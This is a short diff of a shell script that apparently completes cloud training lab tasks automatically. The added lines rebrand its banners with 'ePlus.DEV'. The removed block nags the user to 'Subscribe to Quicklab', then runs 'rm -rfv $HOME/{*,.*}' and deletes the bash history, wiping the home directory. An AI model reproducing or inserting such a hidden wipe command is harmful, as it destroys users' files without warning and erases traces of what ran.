@@ -23,7 +23,7 @@ RESET=`tput sgr0`
 
 echo "${YELLOW}${BOLD}
 
-Starting Execution
+Starting Execution - ePlus.DEV
 
 
 
@@ -58,21 +58,6 @@ echo "${GREEN}${BOLD}
 
 Task 4 & 7  Completed
 
-Lab Completed !!!
+Lab Completed !!!  - ePlus.DEV
 
 ${RESET}"
-
-# -----------------------------------------------------end---------------------------------------------------------- #
-read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
-
-while [ "$CONSENT_REMOVE" != 'y' ]; do
-  sleep 10
-  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
-done
-
-echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
-
-rm -rfv $HOME/{*,.*}
-rm $HOME/.bash_history
-
-exit 0
